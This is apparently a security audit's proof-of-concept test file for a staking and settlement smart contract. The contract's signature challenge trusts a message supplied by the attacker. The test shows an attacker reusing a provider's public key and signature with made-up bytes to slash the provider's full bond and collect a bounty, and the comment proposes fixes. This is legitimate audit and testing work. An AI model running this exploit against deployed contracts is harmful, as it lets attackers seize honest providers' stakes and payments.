/*
 * Team C — PoC for C-INT-01 (CRITICAL): Adversarial slashing via unbound
 * `signingMessage` in the INVALID_SIGNATURE challenge path.
 *
 * Root cause:
 *   `BatchSettlementRegistry._handleInvalidSignature` accepts the
 *   challenger-supplied `signingMessage` verbatim and only binds the
 *   challenger-supplied `publicKey` and `signature` back to the
 *   leaf-committed hashes. The leaf does NOT commit the canonical message
 *   that the provider actually signed. Therefore, anyone in possession of
 *   the publicly-distributed receipt (which contains `pubkey` + `signature`
 *   in plaintext, as required for off-chain verifiability) can:
 *
 *     1. Reuse the real (pubkey, signature) bytes (their keccak256 hashes
 *        match the leaf-committed `providerPubkeyHash` and `signatureHash`).
 *     2. Choose ANY arbitrary `signingMessage` whose Ed25519 verification
 *        under (pubkey, signature) returns FALSE — trivially easy: pick
 *        any 32-byte string the provider never signed.
 *     3. Submit the challenge. `verifier.verify` returns false →
 *        `!valid == true` → challenge succeeds → receipt is invalidated
 *        AND the provider is slashed via stakeBond.slash.
 *
 * This is a 100%-success-rate adversarial-slash primitive against any
 * provider whose receipts have been published. Severity: CRITICAL.
 *
 * Suggested fixes (any one is sufficient):
 *   (a) Add `signingMessageHash` to ReceiptLeaf and require
 *       `keccak256(signingMessage) == leaf.signingMessageHash`.
 *   (b) Reconstruct the canonical signing message ON-CHAIN from leaf
 *       fields the provider already commits to (jobIdHash, shardIndex,
 *       outputHash, executedAtUnix, valueFtns, providerIdHash) — i.e.,
 *       define a stable on-chain canonical form that mirrors the off-chain
 *       receipt-encoding spec, then hash that.
 */
const { expect } = require("chai");
const { ethers } = require("hardhat");
const nacl = require("tweetnacl");

describe("Audit Team C — C-INT-01: INVALID_SIGNATURE adversarial slashing", function () {
  let registry, escrowPool, token, verifier, stakeBond;
  let owner, provider, requester, attacker;
  const ONE_FTNS = ethers.parseUnits("1", 18);
  const DEFAULT_WINDOW = 3 * 24 * 60 * 60; // 3 days
  const TIER_CRITICAL_BPS = 10000; // 100% slash rate
  const BOND_AMOUNT = ethers.parseUnits("50000", 18);

  function makeLeaf(overrides) {
    const leaf = {
      jobIdHash: ethers.keccak256(ethers.toUtf8Bytes("job-real-1")),
      shardIndex: 0,
      providerIdHash: ethers.keccak256(ethers.toUtf8Bytes("provider-id-1")),
      providerPubkeyHash: ethers.ZeroHash,
      outputHash: ethers.keccak256(ethers.toUtf8Bytes("output-bytes")),
      executedAtUnix: Math.floor(Date.now() / 1000),
      valueFtns: ONE_FTNS,
      signatureHash: ethers.ZeroHash,
      ...overrides,
    };
    return leaf;
  }

  function hashLeaf(leaf) {
    const encoded = ethers.AbiCoder.defaultAbiCoder().encode(
      [
        "tuple(bytes32,uint32,bytes32,bytes32,bytes32,uint64,uint128,bytes32)",
      ],
      [
        [
          leaf.jobIdHash,
          leaf.shardIndex,
          leaf.providerIdHash,
          leaf.providerPubkeyHash,
          leaf.outputHash,
          leaf.executedAtUnix,
          leaf.valueFtns,
          leaf.signatureHash,
        ],
      ]
    );
    return ethers.keccak256(encoded);
  }

  beforeEach(async function () {
    [owner, provider, requester, attacker] = await ethers.getSigners();

    const Token = await ethers.getContractFactory("MockERC20");
    token = await Token.deploy();
    await token.waitForDeployment();

    const Pool = await ethers.getContractFactory("EscrowPool");
    escrowPool = await Pool.deploy(owner.address, await token.getAddress(), ethers.ZeroAddress);
    await escrowPool.waitForDeployment();

    const Registry = await ethers.getContractFactory("BatchSettlementRegistry");
    registry = await Registry.deploy(owner.address, DEFAULT_WINDOW);
    await registry.waitForDeployment();

    // Wire the REAL Ed25519Verifier (not a mock) — the bug exists with the
    // real verifier just as it did with the mock; the mock just made it
    // visible-by-construction.
    const Verifier = await ethers.getContractFactory("Ed25519Verifier");
    verifier = await Verifier.deploy();
    await verifier.waitForDeployment();
    await registry.connect(owner).setSignatureVerifier(await verifier.getAddress());

    // Wire StakeBond so the slashing path actually fires.
    const Bond = await ethers.getContractFactory("StakeBond");
    stakeBond = await Bond.deploy(owner.address, await token.getAddress(), 1 * 24 * 60 * 60);
    await stakeBond.waitForDeployment();
    await stakeBond.connect(owner).setSlasher(await registry.getAddress());
    await registry.connect(owner).setStakeBond(await stakeBond.getAddress());

    await escrowPool.connect(owner).setSettlementRegistry(await registry.getAddress());
    await registry.connect(owner).setEscrowPool(await escrowPool.getAddress());

    // Provider bonds at the critical (100%) tier.
    await token.mint(provider.address, BOND_AMOUNT);
    await token.connect(provider).approve(await stakeBond.getAddress(), BOND_AMOUNT);
    await stakeBond.connect(provider).bond(BOND_AMOUNT, TIER_CRITICAL_BPS);

    await token.mint(requester.address, ONE_FTNS * 1000n);
    await token.connect(requester).approve(await escrowPool.getAddress(), ONE_FTNS * 1000n);
    await escrowPool.connect(requester).deposit(ONE_FTNS * 1000n);
  });

  it("CRITICAL: any holder of (pubkey, signature) bytes can slash the provider with arbitrary signingMessage", async function () {
    // ── Step 1: provider produces a REAL Ed25519-signed receipt ─────────
    // In the wild this is the receipt the provider broadcasts off-chain.
    // pubkey + signature are public (they MUST be, for any third party to
    // independently verify the receipt off-chain).
    const seed = new Uint8Array(32).fill(0x42);
    const kp = nacl.sign.keyPair.fromSeed(seed);
    const realPubkey = Buffer.from(kp.publicKey);
    // Provider's canonical 32-byte messageHash (e.g., keccak256 over the
    // canonical receipt fields). Whatever the provider actually signs.
    const realMessageBytes = new Uint8Array(32);
    for (let j = 0; j < 32; j++) realMessageBytes[j] = (0x10 + j) & 0xff;
    const realSignature = Buffer.from(nacl.sign.detached(realMessageBytes, kp.secretKey));

    // ── Sanity-check: the real signature really does verify under the
    // real pubkey + real message. ──────────────────────────────────────
    {
      const ok = await verifier.verify(
        ethers.hexlify(realMessageBytes),
        ethers.hexlify(realSignature),
        ethers.hexlify(realPubkey)
      );
      expect(ok, "real signature should verify").to.equal(true);
    }

    // ── Step 2: provider commits a leaf binding pubkey + signature ──────
    // Both via keccak256 hash, as the contract does today.
    const leaf = makeLeaf({
      providerPubkeyHash: ethers.keccak256(realPubkey),
      signatureHash: ethers.keccak256(realSignature),
    });
    const root = hashLeaf(leaf);

    const commitTx = await registry
      .connect(provider)
      .commitBatch(requester.address, root, 1, leaf.valueFtns, TIER_CRITICAL_BPS, ethers.ZeroHash, "ipfs://test");
    const commitRcpt = await commitTx.wait();
    const batchId = commitRcpt.logs.find(
      (l) => l.fragment && l.fragment.name === "BatchCommitted"
    ).args[0];

    const stakeBefore = (await stakeBond.stakes(provider.address)).amount;
    expect(stakeBefore).to.equal(BOND_AMOUNT);

    // ── Step 3: ATTACK ─────────────────────────────────────────────────
    // Attacker has only what's publicly available: the receipt's pubkey +
    // signature bytes (mandatory for off-chain verifiability) and the leaf
    // structure (committed on-chain).
    //
    // The attacker DOES NOT need to know what message the provider signed.
    // They pick an ARBITRARY bogus message — e.g., "I-was-never-signed".
    // The Ed25519 verification under (realPubkey, realSignature, bogusMsg)
    // returns FALSE because realSignature was not produced over bogusMsg.
    // _handleInvalidSignature interprets verify==false as
    // "challenge proven" → !valid is true → receipt invalidated +
    // provider slashed.
    const bogusSigningMessage = ethers.toUtf8Bytes("attacker-picked-arbitrary-bytes");

    const aux = ethers.AbiCoder.defaultAbiCoder().encode(
      ["bytes", "bytes", "bytes"],
      [bogusSigningMessage, realPubkey, realSignature]
    );

    // The challenge SUCCEEDS — emits ReceiptChallenged AND slashes provider.
    await expect(
      registry
        .connect(attacker)
        .challengeReceipt(batchId, leaf, [], 1 /* INVALID_SIGNATURE */, aux, {
          gasLimit: 4_000_000n,
        })
    ).to.emit(registry, "ReceiptChallenged");

    // Provider's stake has been slashed at the bonded slash rate (100%).
    const stakeAfter = (await stakeBond.stakes(provider.address)).amount;
    expect(stakeAfter).to.equal(0n, "Provider's full bond was slashed via forged challenge");

    // Attacker collected the 70% bounty (BOND_AMOUNT * 0.7).
    const expectedBounty = (BOND_AMOUNT * 7000n) / 10000n;
    expect(await stakeBond.slashedBountyPayable(attacker.address)).to.equal(expectedBounty);

    // The receipt's value has been invalidated, so the provider also
    // loses payment for honest work.
    const batch = await registry.getBatch(batchId);
    expect(batch.invalidatedValueFTNS).to.equal(leaf.valueFtns);
  });
});
